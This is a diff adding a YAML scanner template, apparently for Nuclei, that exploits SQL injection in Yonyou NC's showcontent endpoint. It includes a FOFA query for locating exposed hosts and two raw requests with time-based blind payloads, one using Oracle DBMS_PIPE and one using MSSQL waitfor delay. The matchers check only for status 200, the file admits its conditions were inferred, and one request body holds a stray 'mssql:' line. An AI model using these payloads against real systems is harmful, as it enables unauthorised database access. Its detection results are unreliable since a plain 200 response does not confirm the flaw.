@@ -1,0 +1,47 @@
+id: poc-uplt0ewqx4d93brg
+info:
+  name: 用友nc-showcontent-Sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uplt0ewqx4d93brg
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: uplt0ewqx4d93brg
+    fofa: body="UClient.dmg"
+http:
+- raw:
+  - 'GET /ebvp/infopub/showcontent?id=1''%20AND%203983=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(76)||CHR(108)||CHR(101),9)%20AND%20''Mgtn''=''Mgtn HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Accept-Encoding: identity
+
+    Connection: close
+
+    Content-Type: text/xml; charset=utf-8
+
+    SL-CE-SUID: 31
+
+
+    mssql:'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /ebvp/infopub/showcontent?id=1''%20waitfor%20delay%20''0:0:6 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
